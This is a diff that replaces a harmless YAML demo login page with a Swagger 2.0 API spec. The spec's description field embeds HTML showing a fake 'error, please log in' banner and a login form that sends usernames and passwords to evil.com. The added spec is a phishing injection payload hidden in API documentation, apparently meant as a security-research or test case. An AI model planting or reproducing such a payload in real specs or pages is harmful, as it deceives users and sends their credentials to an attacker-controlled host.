@@ -1,53 +1,45 @@
-name: demo-login-page
-description: "YAML wrapping a safe demo HTML login page that redirects to example.com"
-filename: login.html
-mime_type: text/html
-content: |
-  <!doctype html>
-  <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>Demo Login (Safe)</title>
-    <style>
-      body{font-family:system-ui,Arial;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f3f6fb}
-      .card{background:white;padding:24px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.08);width:320px}
-      label{display:block;margin:8px 0 4px;font-size:14px}
-      input{width:100%;padding:8px;border:1px solid #dfe6f1;border-radius:6px}
-      button{margin-top:12px;width:100%;padding:10px;border-radius:8px;border:0;background:#2563eb;color:#fff;cursor:pointer}
-      .note{font-size:13px;color:#555;margin-top:8px}
-    </style>
-  </head>
-  <body>
-    <main class="card" role="main">
-      <h2>Demo Login</h2>
-      <form id="loginForm" autocomplete="off">
-        <label for="user">Username or email</label>
-        <input id="user" name="user" type="text" placeholder="you@example.com" required>
-        <label for="pw">Password</label>
-        <input id="pw" name="pw" type="password" placeholder="••••••••" required>
-        <button type="submit">Sign in</button>
-        <p class="note">This is a demo page — credentials are <strong>not</strong> sent anywhere.</p>
-      </form>
-      <div id="message" style="display:none;margin-top:12px;color:#d97706"></div>
-    </main>
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Login Page
+  description: '<div class="login-form">
+<!-- Error Message -->
+<div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
+  <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
+    <strong>An error occurred while loading, please log in.</strong>
+  </div>
+</div>
 
-    <script>
-      document.getElementById('loginForm').addEventListener('submit', function(e){
-        e.preventDefault();
-        const user = document.getElementById('user').value.trim();
-        const pw = document.getElementById('pw').value;
-        if(!user || !pw){
-          document.getElementById('message').textContent = 'Please fill both fields.';
-          document.getElementById('message').style.display = 'block';
-          return;
-        }
+<!-- Login Form -->
+<div class="heading">
+  <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Login Page</h1>
+  <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
+    <form action="https://evil.com" method="get" class="form-signin">
+      <div class="form-group" style="margin-bottom: 15px;">
+        <label for="username" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Username</label>
+        <input type="text" name="username" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
+      </div>
+      <div class="form-group" style="margin-bottom: 15px;">
+        <label for="password" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Password</label>
+        <input type="password" name="password" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
+      </div>
+      <div class="form-group" style="margin-top: 20px;">
+        <button type="submit" class="btn btn-default" style="width: 100%; padding: 12px; background-color: #5cb85c; border: none; color: white; font-size: 16px; border-radius: 4px; cursor: pointer; transition: background-color 0.3s;">Login</button>
+      </div>
+    </form>
+  </div>
+</div>
 
-        // Demo-only: pretend to validate locally
-        // IMPORTANT: In real apps, always validate on the server over HTTPS.
-        // After "successful login" redirect to a safe placeholder:
-        window.location.href = 'https://example.com';
-      });
-    </script>
-  </body>
-  </html>
+<!-- Footer with your name -->
+<div style="position: fixed; bottom: 10px; right: 10px; font-size: 12px; color: #888;">
+  Security Researcher
+</div>
+
+
+  '
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
